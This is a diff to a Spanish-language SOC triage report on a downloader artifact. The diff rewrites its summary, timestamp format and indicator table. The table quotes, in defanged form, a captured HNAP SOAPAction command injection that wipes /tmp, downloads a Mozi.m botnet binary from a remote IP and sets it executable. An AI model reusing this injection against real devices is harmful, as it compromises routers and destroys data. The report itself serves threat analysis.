@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with very long lines (531), with CRLF line terminators de 795 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `envelope` en `hxxp://schemas[.]xmlsoap[.]org/soap/envelope/`. Se extrajeron 5 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:52:40+00:00`
+- **Registrado:** `2026-08-09T19:52:40.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -53,15 +54,15 @@ SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
+| url | hxxp://schemas[.]xmlsoap[.]org/soap/envelope/ | strings |
+| url | hxxp://www[.]w3[.]org/2001/XMLSchema-instance | strings |
+| url | hxxp://www[.]w3[.]org/2001/XMLSchema | strings |
+| url | hxxp://purenetworks[.]com/HNAP1/ | strings |
+| url | hxxp://188.59.74.XXX:35928/Mozi.m | strings |
 | ip | 188.59.74.XXX | static_analysis |
 | ip | 190.179.169.XXX | static_analysis |
-| url | hxxp://188.59.74.XXX:35928/Mozi.m | strings |
-| url | hxxp://purenetworks[.]com/HNAP1/ | strings |
-| url | hxxp://schemas[.]xmlsoap[.]org/soap/envelope/ | strings |
-| url | hxxp://www[.]w3[.]org/2001/XMLSchema | strings |
-| url | hxxp://www[.]w3[.]org/2001/XMLSchema-instance | strings |
-| hash | 728585b3188c76cd363b9a2de508ec6b269e3750960562720eab05e0b38f2782 | static_analysis |
 | command | SOAPAction: hxxp://purenetworks[.]com/HNAP1/`cd /tmp && rm -rf * && wget hxxp://188.59.74.XXX:35928/Mozi.m && chmod 777 /t | strings |
+| hash | 728585b3188c76cd363b9a2de508ec6b269e3750960562720eab05e0b38f2782 | static_analysis |
 
 ## 🔎 Triage
 
